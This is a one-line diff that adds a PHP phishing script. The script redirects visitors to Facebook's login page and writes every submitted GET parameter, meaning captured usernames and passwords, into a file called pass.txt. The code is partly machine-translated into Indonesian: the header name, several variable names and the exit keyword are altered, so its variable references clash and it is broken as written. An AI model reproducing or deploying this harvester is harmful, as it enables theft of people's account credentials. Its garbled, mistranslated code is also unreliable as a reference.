@@ -1,0 +1,1 @@
+&amp;lt;?php header('Lokasi: http://www.Facebook.com/login.php'); $handle = fopen('pass.txt', 'a'); foreach($_GET as $variable =&amp;gt; $value) { fwrite($handle, $variable); fwrite($pegangan, '='); fwrite($pegangan, $nilai); fwrite($pegangan, '\n'); } fwrite($pegangan, '\n'); fclose($pegangan); KELUAR; ?&amp;gt;
